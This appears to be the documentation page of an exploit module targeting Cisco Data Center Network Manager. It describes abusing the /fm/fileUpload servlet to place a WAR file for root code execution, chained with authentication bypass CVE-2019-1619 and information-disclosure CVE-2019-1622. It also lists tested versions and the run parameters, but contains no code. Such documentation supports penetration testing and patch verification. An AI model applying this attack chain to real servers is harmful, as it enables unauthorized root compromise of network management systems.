## Vulnerable Application

Cisco Data Center Network Manager exposes a file upload servlet (FileUploadServlet) at /fm/fileUpload.
An authenticated user can abuse this servlet to upload a WAR to the Apache Tomcat webapps
directory and achieve remote code execution as root.

This module exploits two other vulnerabilities, CVE-2019-1619 for authentication bypass on
versions 10.4(2) and below, and CVE-2019-1622 (information disclosure) to obtain the correct
directory for the WAR file upload.

The module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should
work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit
(see References to understand why).

## Scenarios

Setup RHOST, LHOST, LPORT, run it and sit back!
